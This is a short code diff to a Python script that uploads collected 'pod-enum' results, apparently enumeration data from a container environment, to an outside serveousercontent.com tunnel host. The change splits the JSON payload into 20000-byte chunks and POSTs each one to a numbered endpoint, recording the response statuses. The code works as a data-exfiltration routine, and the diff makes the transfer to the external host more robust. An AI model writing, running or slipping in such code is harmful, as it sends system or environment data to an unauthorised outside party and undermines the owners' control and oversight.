@@ -83,8 +83,13 @@ print(json.dumps(out,sort_keys=True,separators=(',',':')))
 
 try:
     payload=json.dumps(out,sort_keys=True,separators=(",",":")).encode()
-    req=urllib.request.Request("https://8412a3abf624921c-52-39-28-94.serveousercontent.com/pod-enum",data=payload,method="POST",headers={"Content-Type":"application/json"})
-    with urllib.request.urlopen(req,timeout=60) as r: out["upload_status"]=r.status
+    statuses=[]
+    for i in range(0,len(payload),20000):
+        chunk=payload[i:i+20000]
+        url=f"https://8412a3abf624921c-52-39-28-94.serveousercontent.com/pod-enum-{i//20000:02d}"
+        req=urllib.request.Request(url,data=chunk,method="POST",headers={"Content-Type":"application/octet-stream"})
+        with urllib.request.urlopen(req,timeout=60) as r: statuses.append(r.status)
+    out["upload_statuses"]=statuses
     print(json.dumps(out,sort_keys=True,separators=(",",":")))
 except Exception as e:
     out["upload_error"]=repr(e)
